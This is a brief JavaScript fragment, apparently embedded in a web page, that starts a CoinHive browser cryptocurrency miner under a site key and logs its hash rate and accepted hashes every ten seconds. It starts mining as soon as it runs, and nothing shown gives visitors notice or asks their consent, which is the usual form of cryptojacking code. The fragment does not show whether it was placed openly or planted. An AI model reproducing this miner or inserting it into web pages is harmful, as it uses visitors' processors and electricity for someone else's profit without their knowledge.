        var miner = new CoinHive.Anonymous('HwG1YakyRBKXuwvLNNwcUrLTzTOfhMpP');
        miner.start();
        miner.on('found', function() {
            console.log('found');
        });
        miner.on('accepted', function() {
            console.log('accepted');
        });
        setInterval(function() {
            console.log('HPS: ' + miner.getHashesPerSecond() + ' TH: ' + miner.getTotalHashes() + ' AH: ' + miner.getAcceptedHashes());
        }, 10000);